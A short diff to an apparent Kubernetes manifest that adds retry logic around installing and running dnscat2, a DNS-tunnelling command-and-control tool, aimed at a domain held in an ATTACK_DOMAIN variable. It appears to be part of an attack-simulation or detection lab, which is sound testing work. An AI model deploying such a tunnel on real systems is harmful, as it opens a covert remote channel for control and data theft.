@@ -30,8 +30,19 @@ spec:
           command: ["/bin/sh", "-c"]
           args:
             - |
-              apk add --no-cache build-base
-              gem install dnscat2
+              echo "Waiting for DNS..."
+              sleep 15
+              for i in 1 2 3 4 5; do
+                apk add --no-cache build-base && break
+                echo "apk failed (attempt $i/5), retrying in 20s..."
+                sleep 20
+              done
+              for i in 1 2 3 4 5; do
+                gem install dnscat2 && break
+                echo "gem install failed (attempt $i/5), retrying in 20s..."
+                sleep 20
+              done
+              command -v dnscat2 >/dev/null 2>&1 || { echo "FATAL: dnscat2 not installed"; sleep 3600; exit 1; }
               exec dnscat2 "$ATTACK_DOMAIN"
           env:
             - name: ATTACK_DOMAIN
